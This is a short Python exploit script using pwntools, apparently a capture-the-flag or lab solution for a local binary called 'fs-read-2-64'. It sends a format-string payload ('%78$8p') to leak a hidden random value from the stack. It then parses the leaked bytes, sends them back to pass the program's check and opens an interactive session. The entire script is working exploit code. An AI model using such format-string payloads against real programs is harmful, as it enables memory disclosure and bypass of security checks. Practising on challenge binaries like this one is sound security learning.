from pwn import *

# Launch processs
p = process('./fs-read-2-64')

# Read rand
print(p.recvline())
p.sendline('%78$8p')

# Get rand
data = p.recvline()
data = data[len(data)-17:len(data)-9]
print(data)

# Send rand
p.sendline(data)
p.interactive()
